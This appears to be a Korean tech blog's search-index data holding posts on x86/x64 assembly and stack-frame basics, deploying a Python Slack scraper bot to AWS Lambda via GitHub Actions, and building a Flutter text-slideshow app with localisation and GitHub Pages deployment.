호출 될 경우, EBP 값이 스택에 push되어, 이전 함수의 EBP값이 스택에 쌓이게 된다. rsp : 스택의 최상단의 주소 x64구조에서 rsp 를 사용하고, x86구조에서는 esp 를 사용했다. esp : 스택 최상단의 주소값 (Stack pointer register) PUSH, POP, SUB, CALL 명령을 수행 할 때 마다 자동으로 변경된다. PUSH, POP 의 기준이 되는 포인터이다. r8 ~ r15까지는 따로 명칭이 없다. 각 레지스터들은 64비트 일때 하위 32비트(=32bit 시스템에서 사용하는 명칭), 하위 16bit, 하위 8bit 를 칭하는 명칭이 각각 존재한다. 64비트 하위32비트 하위16비트 하위8비트 rax eax ax al rbx ebx bx bl rcx ecx cx cl rdx edx dx dl rsi esi si sil rdi edi di dil rbp ebp bp bpl rsp esp sp spl r8 r8d r8w r8b r9 r9d r9w r9b \u0026hellip; \u0026hellip; \u0026hellip; \u0026hellip; r15 r15d r15w r15b 세그먼트 레지스터 cs, ss, ds, es, fs, gs cs : code segment ds : data segment es : extra segment fs, gs : 앞선 세 개의 segment를 만들고 여유분 두개를 추가한 것. cs/ds/es는 CPU가 명확한 사용 용도를 가지는 반면 fs/gs는 정해진 용도가 없어 OS가 임의로 사용 가능 리눅스에서는 fs segment register를 Thread Local Storage(TLS) 의 포인터로 사용한다. 명령어 포인터 레지스터 Instruction Pointer Register, IP rip : 현재 명령 실행 주소 x64구조에서 rip 를 사용하고, x86구조에서는 eip 를 사용했다. 플래그 레지스터 CF(Carry Flag) : 부호 없는 수의 연산 결과가 비트의 범위를 넘을 경우 1로 세팅 ZF(Zero Flag) : 연산의 결과가 0일 경우 1로 세팅 SF(Sign Flag) : 연산의 결과가 음수일 경우 1로 세팅 OF(Overflow Flag) : 부호 있는 수의 연산 결과가 비트 범위를 넘을 경우 1로 세팅 프로시저 특정 주소의 명령어를 실행하도록 하는 코드이다. 프로시저를 사용하면 가독성이 높아지고, 반복되는 코드를 절약할 수 있다. Section object 파일 안에서 재배치 될 수 있는 가장 작은 단위를 섹션(section) 이라 한다. objdump -h 로 목적파일의 Section을 확인할 수 있다. 스택프레임 각 함수들은 실행되면서 지역변수와 임시 값들을 저장해야 하는데, 이 값들은 스택 영역에 저장된다.\n하지만 특정 함수가 사용하고 있는 스택 영역을 다른 함수가 침범하여 사용하지 못하게 하기 위해 함수별로 스택 프레임을 두고 스택 영역을 공용으로 사용하지 못하게 관리한다.\n함수가 호출될 떄 마다 스택프레임이 형성되며, 스택프레임 형성을 어셈블리어로 표현하면 다음과 같다.\npush EIP # 함수 완료 후 실행할 코드의 주소를 스택에 저장\rpush EBP # 함수 완료 후 EBP 포인터를 복구시킬 값을 스택에 저장한다. (이를 SFP라 한다.)\rmov EBP ESP # 스택의 top 주소를 EBP에 대입한다. (EBP를 갱신하여 새로운 스택 프레임의 base를 세팅한다.)\rsub ESP, VALUE # 지역변수가 설정될 영역만큼(VALUE) ESP 주소를 옮긴다. (EBP - ESP 만큼이 지역변수 영역) x64라면 EIP 대신 rip, EBP 대신 rbp, ESP 대신 rsp를 사용한다. 구성된 스택 프레임은 아래와 같이 형성된다.\n---------- \u0026lt;- ESP(rsp)\r지역변수\r---------- \u0026lt;- EBP(rbp)\rSFP\r---------- \u0026lt;- EBP(rbp) + 0x04 (x64라면 +0x08)\rreturn address -\u0026gt; 함수 종료시 EIP(rip) 에 해당 위치의 값 대입\r---------- 만약 Stack canary 기법이 적용되었다면 아래와 같이 canary가 추가된다.\n---------- \u0026lt;- ESP(rsp)\r지역변수\r---------- \u0026lt;- EBP(rbp) - 0x04 (x64라면 -0x08)\rCanary (4byte / x64라면 8byte)\r---------- \u0026lt;- EBP(rbp)\rSFP\r---------- \u0026lt;- EBP(rbp) + 0x04 (x64라면 +0x08)\rreturn address -\u0026gt; 함수 종료시 EIP(rip) 에 해당 위치의 값 대입\r---------- 함수가 종료되면 다음 절차가 수행된다.\nmov ESP, EBP # 지역변수 공간을 해제\rpop EBP # SFP에 정보를 가져와 ebp에 대입\rRET # pop EIP; jmp EIP 동작을 수행한다. 리눅스에서 C 언어로 프로그램을 짜면 보통 libc 라이브러리를 호출하게 되고, 이 경우 main 함수는 __libc_start_main 함수에서 호출된다.\nmain 함수의 스택 프레임을 벗어나 return 주소로 가게 되면 __libc_start_main 함수의 스택 프레임으로 이동할 수 있다. main 함수의 스텍 프레임의 return address 가 __libc_start_main + A 라면, \u0026ldquo;main 함수의 return address\u0026rdquo; - \u0026ldquo;libc 라이브러리에서 __libc_start_main 함수의 offset\u0026rdquo; - \u0026ldquo;A\u0026rdquo; = libc_base 가 된다. 이 사실은 exploit 에 사용될 수 있다. .asm to bin .asm 파일을 바이트 코드로 변경하려면 \u0026ldquo;nasm\u0026rdquo; 이라는 모듈을 사용하면 된다. nasm -f elf YOUR_FILE.asm 명령으로 .o 파일을 생성할 수 있다. 만약 구동중인 컴퓨터가 x86-64 구조라면 elf 대신 elf64를 입력한다. 컴퓨터 구조별 명령은 nasm -fh 로 확인이 가능하다. 생성된 .o 파일은 objdump -d YOUR_OBJ.o 명령으로 내용 확인이 가능하다. 만약 assembly 파일 안에 main 함수를 정의하였다면 gcc YOUR_OBJ.o -o YOUR_OUT.out 명령어로 실행 가능한 ELF 파일을 생성할 수도 있다. objcopy --dump-section .YOUR_SECTION=YOUR_BIN.bin YOUR_OBJ.o 명령으로 .o 파일을 .bin 파일로 변환할 수 있다. section .text 로 어셈블리 영역이 시작된다면 YOUR_SECTION=text 가된다.\nex) test.asm 파일이 아래와 같은 경우,\nsection .text ; 아래에 text 라는 section을 정의한다.\rglobal main ; main 함수를 전역으로 선언한다.\rmain: ; main 함수의 내용을 구현한다.\rpush 0x00 ; 구현부\r... nasm -f elf64 test.asm 을 수행한 후, objcopy --dump-section .text=test.bin test.o 을 수행하면 test.bin 파일을 얻어낼 수 있다.\n생성한 바이너리 파일을 xxd YOUR_BIN.bin 명령으로 내용을 출력할 수 있다. 이는 objdump -s YOUR_OBJ.o 명령의 출력 형태와 동일하다\n","permalink":"https://aswinblue.github.io/Blog/post/assembly/assembly_basic/","summary":"Assembly 기계어로 1대1 대응 가능한 언어로, human readable 한 언어 중 가장 기계어에 가까운 언어이다. 기계어로 컴파일 직전에 어셈블리어로 변환을 거친다. operation code(명령어) 와 operand(피연산자) 로 구성된다. 명령어는 데이터 이동, 산술연산, 논리연산, 비교, 분기, 스택, 프로시저, 시스템콜의 종류가 있다. 피연산자 자리에는 상수(Immediate Value), 레지스터(Register), 메모리(Memory)가 올 수 있다. 숫자를 넣으면 상수이다. [] 로 둘러싸인 숫자는 메모리이다. 메모리 피연산자 앞에는 메모리의 크기를 나타내는 크기 지정자(Size Directive)가 붙을 수 있다. BYTE: 8bit BYTE PTR rax : rax 레지스터의 데이터를 1바이트만큼 참조 WORD: 16bit WORD PTR [0x8048000] : 0x8048000의 데이터를 2바이트만큼 참조 DWORD: 32bit QWORD: 64bit 명령어 mov \u0026ldquo;값\u0026quot;을 레지스터리나 메모리에 저장하는 명령 mov dst, src : src 값을 dst에 덮어씀 mov rdi, rsi : rsi의 값을 rdi에 대입 mov QWORD PTR[rdi], rsi : rsi의 값을 rdi가 가리키는 주소에 대입 mov QWORD PTR[rdi + 8 * rcx], rsi : rsi의 값을 (rdi + 8 * rcx)가 가리키는 주소에 대입 dst = 레지스터, src = 레지스터 : src가 가리키는 주소의 값을 dst가 가리키는 주소의 값에 덮어씀 dst = 메모리, src = 레지스터 : src가 가리키는 주소의 값을 dst가 가리키는 주소의 값에 덮어씀 dst = 레지스터, src = 메모리 : src가 가리키는 주소의 값을 dst가 가리키는 주소의 값에 덮어씀 dst = 메모리, src = 메모리 : 불가능 mov dst, [mem + 4] : mem + 4 주소에 저장된 값을 dst에 덮어씀 dst 값으로는 주소나 포인터가 올 수 있다.","title":"Assembly_basic"},{"content":"Delver 시작날짜: March 18, 2023\n종료날짜: March 28, 2023\n목표 python 기반 웹 scrapping 및 결과를 slack 에 전송하는 slack bot\n요구사항 AWS lambda를 사용하여 동작 매 시간마다 동작하도록 설정 [Delver]🔨 Web scrapper 작성 1. 구현 내용 beautiful soup를 사용하여 특정 web을 scrap (API 참조: https://beautiful-soup-4.readthedocs.io/en/latest/) 여러 사이트에 호환되도록 구조를 설정\n사이트별 속성을 json 형태로 기록\njson 형태를 읽어 코드 변경 없이 사이트 추가할 수 있는 구조로 작성\n2. 문제와 해결 Beautiful soup를 사용하여 특정 문자 찾기 find() 혹은 find_all() 에 string 인자를 넣어서 검색을 하면 반환 값으로html tag 배열이 아니라, string 배열이 온다.\n검색 결과에서 추가적으로 find를 해야할 경우 문자열을 따로 추출하여 검색을 하도록 한다.\nitem 안에 특정 문자열(keywords)이 있는지 확인하는 구문\n위와같이 find_all() 구문에 ‘string’ 파라미터를 넣으면 detected 는 string의 배열을 갖게 된다.\n[Delver]🔨 배포 작업 설명 작성한 코드를 서버에 배포하고, 구동시킨다. github 의 action 을 사용하여 push와 동시에 자동으로 서버에 배포되도록 pipeline을 구축한다. 1. 구현 내용 Delver는 상시 구동이 필요한 프로그램이 아니므로, 비용 절감을 위해 AWS의 lambda 를 사용하여 일정 시간마다 코드를 동작 시킨다. 그러기 위해서는 Delver가 Docker 위에서 실행되도록 세팅이 필요하며, Delver 가 실행되기 위한 모든 사전 조건들(파이썬 버전, 라이브러리 등) 이 Docker 실행과 동시에 모두 설치 되도록 해야 한다. Docker 모듈화 python 코드가 배포될 때, 동작에 필요한 모듈들이 설치 되도록 dependency 설정\npip freeze 명령으로 설치된 모듈들을 확인한 후, 이를 requirements.txt 에 기입한다.\n이후 pip install -r requirements.txt 명령어를 사용해 주면 설정된 의존성 파일들이 모두 설치된다.\nDockerFile을 설정하여 AWS에 docker 형태로 배포될 수 있도록 작성\nAWS 연동 AWS 접속 계정 생성\nIAM에서 AWS API 호출 시 인증에 사용 될 access key 를 발급 받는다.\nIAM → 사용자 → 보안 자격증명 → 액세스키 → 액세스 키 만들기 경로로 생성이 가능하다.\nECR 생성\nAmazon ECR → 리포지토리 에 접속하여 ‘리포지토리 생성’ 버튼을 클릭한다.\n프라이빗 설정으로, 이름을 지정한다.\n태그는 리포지토리 마지막에 붙는 버전을 나타내는 postfix이다. 태그 변경 옵션은, 같은 이름의 태그를 덮어쓸 수 있는지 설정하는 항목이다.\n리포지터리 생성 화면\nLambda 함수 생성\nLambda 에 접속하여 ‘함수생성’ 버튼을 클릭해 함수를 생성한다.\n생성된 ECR 을 실행하는 람다 함수를 생성한다.\n‘컨테이너 이미지’ 를 동작시키도록 설정하여 생성하면 된다.\nLambda 함수가 매일 실행되도록 AWS Cloud Watch (EventBridge) 세팅\n설정 참조: https://docs.aws.amazon.com/AmazonCloudWatch/latest/events/ScheduledEvents.html 시각 표시 규칙\n한국 시간 기준 매일 12시에 동작하도록 설정. 띄워 쓰기 기준으로, cron(분 시 일 월 요일 해) 를 뜻한다.\nEventBridge 설정 내용\nLambda 함수 설정\npython code가 정상적으로 종료되었다는 것을 판단하는 조건 설정필요\nlambda 함수는 실패한 경우 재시도를 수행하는데, 재시도 횟수를 설정할 수 있다. ( Lambda 함수 재시도 참조 : https://repost.aws/knowledge-center/lambda-function-retry-timeout-sdk)\nlambda 함수가 비동기로 실행되는 경우, 실행 완료까지 timeout을 설정할 수 있다. 너무 짧게 잡으면 실행이 완료되지 않아 정상 동작을 해도 실패로 처리될 수 있다.\nGithub action 연동 배포에 필요한 내용들 중 민감한 정보들은 Secret 기능을 활용하여 github 내부적으로 관리한다.\nAPI KEY 혹은 AWS 계정 정보와 같이 외부에 공개되면 안되는 정보들은 github 의 action secret 기능을 통해 코드와 분리된 채로 배포 시 추가될 수 있도록 한다. (참조: https://ji5485.github.io/post/2021-06-26/create-env-with-github-actions-secrets/)\n다른 사용자에게 공개되지 않는 비밀 변수를 생성할 수 있다.\nGithub Action 에서 새로운 작업을 정의한다.\ngithub 레퍼지터리에 들어가면 Action 이라는 탭이 있다.\nNew Workflows 버튼을 누르면 새로운 Action 을 생성할 수 있는데, 그 중에서 미리 만들어진 template 을 골라 사용 할 수도 있지만, 우리는 직접 코드를 짜서 action을 만들 것이기 때문에 아무 템플릿이나 선택한다.\nGithub 와 aws의 pipeline 을 통해 push시 자동으로 aws배포되도록 하는 방법도 있었으나, github action을 이용했다.\nAWS 설정 참조(https://docs.aws.amazon.com/codepipeline/latest/userguide/connections-github.html) Docker를 활용하여 ECR 생성 참조(https://www.youtube.com/watch?v=6O-7zb-igUs) 이후, 아래와 같은 yml 파일을 작성 할 수 있는 창이 뜨는데, 파일의 이름과 내용을 알맞게 집어넣는다.\n필자가 작성한 yml 파일의 이름은 uploadECR.yml 이고, 내용은 아래 링크에서 확인 가능하다. 파일의 내용은, push한 코드를 앞서 생성한 aws lambda 모듈에 연동시키는 것이다.\nhttps://github.com/AswinBlue/SlackBot/blob/master/.github/workflows/uploadECR.yml 앞서 생성한 AWS 계정, ECR, lambda함수 정보가 모두 포함된다. 이렇게 Action 을 설정하면 .github/workflows 디렉터리가 생성되며, git에 commit 을 새로 push 할 때 마다 aws 의 lambda 모듈에 최신 코드가 적용되게 된다.\n2. 문제와 해결 AWS lambda 를 통해 함수를 구동하려면, aws에서 제공하는 기본 python 환경의 모듈들만 사용 가능하다. 나는 slack과 beautifulsoup를 추가로 사용하고 있으므로, 별개의 이미지를 생성해야 한다. ECR(Elastic Container Registry) 를 생성하고 lambda 함수가 그 환경에서 동작하도록 한다. docker를 통해 ECR이 빌드될 수 있도록 DockerFile 및 requirements.txt을 세팅한다. AWS ECR 배포시 EOF 에러가 발생하였다. TRY 1: uses: docker/build-push-action@v2 를 사용하는 대신 run 을 이용하여 직접 docker 명령을 입력하였다. docker build 명령 시 docker build [123456789.dkr.ecr.us-east-1.amazonaws.com/](http://435370146413.dkr.ecr.us-east-2.amazonaws.com/)repo:latest . 와 같이 full repository name을 입력하여야 해당 이름으로 tag가 설정된다. (아니면, 빌드 후 docker tag 명령으로 직접 태그를 설정할 수도 있다.) TRY 2:\nIAM에서 사용자 권한을 변경하였다. AmazonEC2ContainerRegistryReadOnly 권한에 AmazonEC2ContainerRegistryPowerUser 를 추가로 부여하였다. AWS Lambda 함수 설정에도 403 에러가 발생하였다. 아래 권한을 추가로 부여하여 github action에서 uses: appleboy/lambda-action@master 을 호출하여 lambda 함수 설정이 가능하도록 하였다.\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;AllowLambdaFunctionUpload\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;lambda:CreateFunction\u0026#34;, \u0026#34;lambda:GetFunctionConfiguration\u0026#34;, \u0026#34;lambda:UpdateFunctionCode\u0026#34;, \u0026#34;lambda:UpdateFunctionConfiguration\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:lambda:us-east-2:435370146413:function:Delver_webScrap\u0026#34; }, { \u0026#34;Sid\u0026#34;: \u0026#34;AllowLambdaExecutionRole\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;lambda:CreateFunction\u0026#34;, \u0026#34;lambda:GetFunctionConfiguration\u0026#34;, \u0026#34;lambda:GetFunction\u0026#34;, \u0026#34;lambda:ListFunctions\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; } ] } ","permalink":"https://aswinblue.github.io/Blog/post/projects/delver/","summary":"Delver 시작날짜: March 18, 2023\n종료날짜: March 28, 2023\n목표 python 기반 웹 scrapping 및 결과를 slack 에 전송하는 slack bot\n요구사항 AWS lambda를 사용하여 동작 매 시간마다 동작하도록 설정 [Delver]🔨 Web scrapper 작성 1. 구현 내용 beautiful soup를 사용하여 특정 web을 scrap (API 참조: https://beautiful-soup-4.readthedocs.io/en/latest/) 여러 사이트에 호환되도록 구조를 설정\n사이트별 속성을 json 형태로 기록\njson 형태를 읽어 코드 변경 없이 사이트 추가할 수 있는 구조로 작성\n2. 문제와 해결 Beautiful soup를 사용하여 특정 문자 찾기 find() 혹은 find_all() 에 string 인자를 넣어서 검색을 하면 반환 값으로html tag 배열이 아니라, string 배열이 온다.","title":"Delver"},{"content":"Flick Through github: https://github.com/AswinBlue/FlickThrough\nLink : aswinblue.github.io/FlickThrough/\n시작날짜: August 21, 2023\n목표 텍스트 파일을 읽어 단어 단위로 슬라이드 쇼를 수행하는 앱 제작\n요구사항 텍스트 파일의 공백과 줄바꿈을 기준으로 단어를 나누고 이를 화면에 출력 출력은 한 단어씩 이루어 지며 분당 300개를 기본으로, 속도는 조절 가능 단어 자르는건 커스텀 가능 특정 문자마다 딜레이 다르게 줄 수 있도록 설정 스크린샷 혹은 클립보드의 내용도 사용할 수 있도록 함 기능 구현 1. 구현 내용 UI 구성 텍스트가 출력될 텍스트박스, 진행률 표시바, 시작/일시정지 버튼, 속도 조절 스크롤바, 파일 읽기 버튼을 구성\n파일 로드 기능\n파일 로드 버튼을 클릭해서 읽을 텍스트 파일 로드 파일을 단어 단위로 나누어 List 형태로 저장 재생 기능\n재생 버튼을 눌러 재생/일시정지 상태 변경 List형태로 저장된 단어들을 일정 시간 delay를 두고 화면에 순서대로 출력 진행률조절\n진행률 표시바를 클릭 혹은 드래그 하여 진행 위치를 조절 재생속도 조절\n재생 속도 설정 스크롤 바를 드래그 혹은 클릭하여 단어가 표시될 시간을 조절 클립보드 사용\n클립 보드를 사용할 수 있도록 Text Box 추가, dialog안의 text box에 내용을 채워넣으면 해당 내용으로 flick through 실행\nPaste from clip board 버튼을 추가\n버튼을 누르면 dialog 창이 발생하고, 여기서 confirm 을 누르면 해당 텍스트로 슬라이드 플레이 가능\n다개국어 기능\nintl, flutter_localizations 모듈을 사용하기 위해 pubsec.yml 파일에 필요한 모듈 및 속성들을 추가한다.\ndependencies: flutter: sdk: flutter intl: ^0.18.0 flutter_localizations: sdk: flutter ... dev_dependencies: build_runner: ^2.4.6 intl_translation: ^0.18.2 flutter: generate: true # 자동생성 활성화 StatelessWidget 에 flutter_localization 모듈 설정을 해주고, 필요한 모듈을 import 한다.\nimport \u0026#39;package:flutter_localizations/flutter_localizations.dart\u0026#39;; import \u0026#39;package:intl/intl.dart\u0026#39;; import \u0026#39;package:flutter_gen/gen_l10n/app_localizations.dart\u0026#39;; void main() { runApp(MyApp()); } class MyApp extends StatelessWidget { @override Widget build(BuildContext context) { return MaterialApp( title: \u0026#39;Multi-Language App\u0026#39;, localizationsDelegates: const [ GlobalMaterialLocalizations.delegate, GlobalWidgetsLocalizations.delegate, GlobalCupertinoLocalizations.delegate, AppLocalizations.delegate, // 명령어로 생성할 AppLocations class도 delegate ], supportedLocales: AppLocalizations.supportedLocales, // AppLocalizations 생성시 자동으로 세팅되어 있음 home: MyHomePage(), ); } } l10n.yaml 파일을 프로젝트 root 에 아래와 같이 작성한다.\narb-dir: arb파일이 들어있는 경로(project root로부터 상대경로)\ntemplate-arb-file: 사용 언어를 찾지 못했을 때 사용할 언어 파일\noutput-localization-file: arb 파일로 생성할 dart 파일. AppLocalizations class가 정의되어있음\narb-dir: lib/l10n template-arb-file: app_en.arb output-localization-file: app_localizations.dart arb 파일을 lib/l10n 경로에 생성하여 json 형식으로 key-value 세트로 다국어로 번역할 단어를 적는다. 아래는 영어로 번역할 내용의 예시이다. arb 파일의 key는 함수 이름으로 치환되기 때문에 알파벳 소문자로 시작해야 하며, 알파벳이 아닌 다른 문자를 포함하면 안된다. (camel case 사용)\n{ \u0026#34;@@locale\u0026#34;: \u0026#34;en\u0026#34;, \u0026#34;pasteFromClipBoard\u0026#34;: \u0026#34;Paste from clip board\u0026#34;, \u0026#34;textFileReader\u0026#34;: \u0026#34;Text File Reader\u0026#34;, } main.dart에서 다국어를 지원할 text 를 아래와 같이 치환한다. (context 객체가 있어야 함에 주의)\nAppLocalizations.of(context)!.pasteFromClipBoard # 영어 사용권에서 \u0026#34;Paste from clip board\u0026#34; 로 치환됨 flutter pub get 명령을 실행(안드로이드 스튜디오에서는 get dependencies 버튼으로 수행 가능)하여 pubsec.yml 파일을 갱신하면 l10n.yaml 파일에 따라 자동으로 아래와 같은 dart 파일이 생성된다.\nimport \u0026#39;package:intl/intl.dart\u0026#39;; class AppLocalizations { static String of(BuildContext context, String key) { return Intl.message(key, locale: Localizations.localeOf(context).toLanguageTag()); } } → 이 방법은 공식 다국어 지원 방식이지만, 언어 변환에 context 객체가 필요하다는 점이 단점이다.\n2. 문제와 해결 logic에 적용된 delay가 UI에도 적용되어 delay 시간동안 UI가 응답하지 않음\nawait를 사용하여 UI와 병렬로 동작하도록 구현 LinearProgressIndicator 형태는 터치를 지원하지 않음 → GestureDetector 로 캡슐화 하여 터치를 직접 설정할 수 있음\nGestureDetector로 스크롤시, 화면 밖을 벗어나는 영역까지 드래그를 해도 위치가 인식이 된다. 이 때문에 진행률이 음수가 되거나, 100%를 초과하는 경우가 발생하여 logic상으로 border를 처리해 주어야 한다.\nWebBrowser 와 AndroidApp는 파일을 로드하는 방법이 다르다.\n→ web에서 동작하는지, app에서 동작하는지 런타임에 확인할 수 있는 구분자를 사용하여 각각 다른 방법으로 동작하게 분기처리 한다.\nloadTextFile은 _MyHomePageState class의 멤버 함수이다.\ndart:html 은 모바일 기기 빌드 환경에서는 import 할 수 없는 모듈이다. → 조건부 import 구문을 사용하여 특정 조건에서만 해당 라인이 동작하도록 한다. (참조 : https://letyarch.blogspot.com/2021/11/dart-conditional-importexport.html)\nplatform에 따라 web.dart와 app.dart로 파일을 분리한다. ![Untitled](/IMAGE_FLICKTHROUGH_APP/Untitled%208.png)\r2) abstract class를 형성하고, 각 platform dependent 한 로직들은 abstract class 를 상속받아서 web.dart와 app.dart에 작성한다. ![abstract 함수를 선언하고, 조건부 import를 통해 컴파일타임 분기](/IMAGE_FLICKTHROUGH_APP/Untitled%209.png)\rabstract 함수를 선언하고, 조건부 import를 통해 컴파일타임 분기\r![상속받아 만든 함수 (for app)](/IMAGE_FLICKTHROUGH_APP/Untitled%2010.png)\r상속받아 만든 함수 (for app)\r3) conditional import 를 활용하여 컴파일 타임에 파일을 분리해서 import하도록 세팅\r→ `import ‘app.dart’ if (dart.library.html) ‘web.dart';`\r- conditional import 관련 문서 : [https://dart.dev/guides/libraries/create-packages#conditionally-importing-and-exporting-library-files](https://dart.dev/guides/libraries/create-packages#conditionally-importing-and-exporting-library-files)\r- 구현 예시 : https://github.com/Zeruel92/cross_picker\r- factory 생성자 관련 설명 : [https://juwon-yun.tistory.com/81](https://juwon-yun.tistory.com/81)\r- conditional import와 factory 패턴 적용 : [https://medium.com/flutter-community/conditional-imports-across-flutter-and-web-4b88885a886e](https://medium.com/flutter-community/conditional-imports-across-flutter-and-web-4b88885a886e)\r- conditional import 사용한 예시 : https://github.com/dart-lang/sdk/issues/48320\r→ 결론, 1. conditional import를 사용해야하는 것은 맞음. 2. factory pattern을 사용하여, getFileLoader() 호출시 특정 객체가 호출되도록 함. (함수는 전역으로 선언해야 함)\r![conditional import/export를 통해 필요한 파일만 플랫폼에 맞게 컴파일타임에 선택 ](/IMAGE_FLICKTHROUGH_APP/Untitled%2011.png)\rconditional import/export를 통해 필요한 파일만 플랫폼에 맞게 컴파일타임에 선택 1. 파일을 나누어 각 플랫폼별로 class를 따로 정의, interface를 상속받도록 하고, 각 파일에서 getFileLoader 을 선언한다. (conditional import를 사용하기 때문에 getFileLoader은 중복 선언되지 않고 컴파일타임에 하나만 선택된다. 2. base class를 상속하고, 플랫폼별로 동작이 달라지는 function을 override(재정의) 해서 각 플랫폼마다 다르게 동작하도록 하면 된다. ![Untitled](/IMAGE_FLICKTHROUGH_APP/Untitled%2012.png)\r![Untitled](/IMAGE_FLICKTHROUGH_APP/Untitled%2013.png)\r3. main에서 getFlieLoader() 로 객체를 호출하면 플랫폼에 맞는 알맞은 객체가 생성된다.\r![Untitled](/IMAGE_FLICKTHROUGH_APP/Untitled%2014.png)\r실패1. main에서 호출한 AbstractFileLoader는 loadFile이 미구현된 상태. 미구현 에러 발생\r![cross_platform.dart 파일, base class를 선언](/IMAGE_FLICKTHROUGH_APP/Untitled%2015.png)\rcross_platform.dart 파일, base class를 선언\r![app.dart 파일, base class를 상속받고 loadFile 함수 재정의](/IMAGE_FLICKTHROUGH_APP/Untitled%2016.png)\rapp.dart 파일, base class를 상속받고 loadFile 함수 재정의\r![main.dart에서 base class 생성](/IMAGE_FLICKTHROUGH_APP/Untitled%2017.png)\rmain.dart에서 base class 생성\r![base class에서 구현된 function 호출](/IMAGE_FLICKTHROUGH_APP/Untitled%2018.png)\rbase class에서 구현된 function 호출\r안드로이드 read external memory 권한 Platform exception: PlatformException(read_external_storage_denied, User did not allow reading external storage, null, null) 와 같은 에러 발생\nandroid/app/src/main/AndroidManifest.xml 파일에 \u0026lt;uses-permission android:name=\u0026quot;android.permission.READ_EXTERNAL_STORAGE\u0026quot; /\u0026gt; 구문이 선언되어있는지 확인. 해당 태그는 manifest 직속, application 선언전에 호출되어야 한다.\nflutter에 권한 관리 모듈을 추가해야 한다. pubsec.yaml 파일에 permission_handler dependency를 추가한다. 이후 permission 이 필요한 동작을 호출하는 함수가 있는 파일에 permission_handler 모듈을 추가한다. import 'package:permission_handler/permission_handler.dart'; 모듈을 이용하여 권한을 체크하는 함수를 생성하고, 저장소 접근 전 권한을 먼저 체크한다. 권한이 없다면 자동으로 팝업을 띄워 권한을 요청하도록 되어있다.\n이후 await 를 통해 결과를 받아서 결과에 따른 처리를 수행하도록 한다.\n다개국어 지원시 AppLocations.of(context) 에서 null을 반환하여 랜더링 실패\nText(AppLocalizations.*of*(context)!.pasteFromClipBoard),) 형태를 widget에 넣을 때, 해당 값이 null로 치환되면 랜더링 오류가 발생한다.\n설정을 제대로 했는지 확인한다. 내 경우에는 아래 라인을 넣지 않아서 오류가 발생했다.\n설정도 제대로 했다면, l10n.yaml에서 언어를 감지하지 못했을 때 동작할 default language를 설정 해 준다.\n이 또한 먹히지 않는다면 MaterialApp 생성시 localeListResolutionCallback 항목을 아래와 같이 파라미터로 추가해 준다. 언어를 감지하지 못했을 시 default language 팩을 en 으로 설정하는 내용이다.\nlocaleListResolutionCallback: (locales, supportedLocales) { print(\u0026#39;device locales=$locales supported locales=$supportedLocales\u0026#39;); for (Locale locale in locales!) { // if device language is supported by the app, // just return it to set it as current app language if (supportedLocales.contains(locale)) { return locale; } } // if language of current location is not supported, use english return Locale(\u0026#39;en\u0026#39;); }, 다개국어 테스트\n구현은 성공적으로 마쳤지만, 한국에서 테스트를 하면 ‘ko’ 밖에 확인할 수 없다. 3. 참조 intl 패키지 intl 패키지는 다국어 설정을 할 때 많이 사용되며, ‘arb’ 확장자의 파일을 dart 파일 형태로, 혹은 그 반대로 변환할 수 있는 패키지이다.\nex) arb 파일을 dart 파일로 변환 flutter pub pub run intl_translation:generate_from_arb \\ --output-dir=lib/localizations \\ lib/localizations/app_localizations.dart \\ lib/localizations/app_localizations_en.arb \\ lib/localizations/app_localizations_es.arb ex) dart 파일을 arb 파일로 변환 flutter pub run intl_translation:extract_to_arb --output-dir=lib/i18n lib/i18n/messages.dart 혹은 i18n.yaml 이름으로 yaml 파일을 생성하여 root 폴더에 넣어두면 pub get package 명령어 실행, 혹은 IDE의 pubsec.yaml 파일 업데이트시 각 yaml 파일의 설정에 따라 arb 파일로 dart 파일을 생성할 수 있다. 파일의 내용은 다음과 같다.\narb-dir: lib/l10n template-arb-file: app_en.arb output-localization-file: app_localizations.dart arb-dir: arb파일이 존재하는 디렉터리 경로 template-arb-file: 사용할 arb 파일 output-localization-file: arb파일을 변환하여 생성할 dart 파일의 이름, 파일은 .darttool/fluttergen/genl10n/ 경로에 생성되며 import 'package:flutter_gen/gen_l10n/app_localizations.dart' 형태로 import 가능하다.\nl10n은 localization이라는 뜻이며, 이외에도 아래와 같은 축약어가 사용된다.\nl10n.yaml (localization) i18n (internationalization) g11n (globalization) m17n (multilingalization)\n다국어 설정 방법 1 (intl, l10n.yaml을 사용한 공식 방식) : https://fronquarry.tistory.com/8\n다국어 설정 방법 2 (intl과 command를 통한 방식) : https://fronquarry.tistory.com/8\n두 방식을 비교한 내용 : https://jay-flow.medium.com/flutter-localizations-완전-정복-하기-8fa5f50a3fd2\n배포 1. 구현 내용 github에 web 페이지 배포 root 경로에 .github/workflows/web.yml 파일을 만든다. name: github-page-work # 작업 이름 on: push: branches: [master] # master 브랜치의 코드 사용해서 동작 # Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages permissions: contents: read pages: write id-token: write jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 with: token: ${{ secrets.GIT_TOKEN }} - uses: subosito/flutter-action@v1 - uses: bluefireteam/flutter-gh-pages@v7 with: baseHref: /FlickThrough/ https://github.com/settings/tokens 에 접속하여 ‘generate new token’을 선택하여 신규 token을 생성한다.\n배포만이 목적이라면 아래와 같이 권한을 설정 해 주면 충분하다. 토큰이 생성되면 페이지를 닫지 말라. 현재 페이지를 벗어나면 다시 토큰을 볼 수 없다. 그 상태에서 바로 코드가 들어있는 github repository의 setting 으로 진입한다. (https://github.com/AswinBlue/FlickThrough/settings)\nrepository 설정에서 “Secrets and variables” 메뉴에 진입하고, ‘Secrets’ 탭을 선택한 후 ‘New Repository Secret’ 버튼을 눌러서 GIT_TOKEN 을 key로, 이전 단계에서 받은 token을 value로 설정하여 secret variable을 하나 생성한다. (생성한 secret variable도 다시 확인할 수 없으므로 주의한다. 또한 GITHUB_ 로 시작하는 key의 secret varaible은 생성할 수 없다) 